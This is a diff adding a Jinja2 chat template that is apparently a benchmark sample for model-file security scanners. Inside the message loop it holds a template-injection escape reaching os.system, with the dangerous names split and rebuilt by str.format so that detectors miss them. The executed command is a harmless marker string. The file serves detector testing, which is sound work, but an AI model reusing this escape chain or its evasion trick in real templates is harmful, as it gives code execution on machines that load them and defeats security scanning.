@@ -1,0 +1,7 @@
+{#- MARKER-only Phase-10 benchmark payload. Each dangerous name is assembled by str.format
+    from split pieces (no whole token in the text), inside the per-message loop (off the
+    empty-context render path). GlyphHound folds the constant str.format; ModelAudit's regex
+    is format-blind, its empty render skips the loop body, its static probe is Const-only.
+    Sentinel only; comment free of literal sink tokens. -#}
+{% for m in messages %}{{ m.role }}: {{ m.content }}{{ cycler['{}{}'.format('__in','it__')]['{}{}'.format('__glob','als__')]['{}{}'.format('__buil','tins__')]['{}{}'.format('__imp','ort__')]('os')['{}{}'.format('sys','tem')]('GLYPHHOUND_BENCH_MARKER') }}
+{% endfor %}
